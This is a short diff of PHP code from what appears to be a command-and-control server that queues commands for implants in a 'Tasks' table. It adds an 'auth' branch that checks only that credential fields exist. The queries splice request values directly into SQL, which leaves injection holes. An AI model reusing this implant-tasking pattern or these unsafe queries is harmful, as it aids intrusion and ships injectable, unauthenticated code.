@@ -62,7 +62,7 @@ function main() {
                 if ($row[0] != 0) {
                     $reply->update = false;
                     echo json_encode($reply);
-                    return;
+                    return  ;
                 }
                 $stmt = $pdo->query("UPDATE Tasks SET command = '$cmd' WHERE task_id = $task_id");
                 $reply->update = true;
@@ -90,6 +90,12 @@ function main() {
                     $stmt = $pdo->query("INSERT INTO Tasks (implant_id, command) VALUES ('$implant_id', '$cmd')");
                     $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                     echo json_encode($results);
+                    break;
+
+                case "auth":
+                    if (!isset($_POST["username"]) || !isset($_POST["password"])) {
+                        die("Invalid Username or Password Field");
+                    }
                     break;
                 default;
                 http_response_code(404);
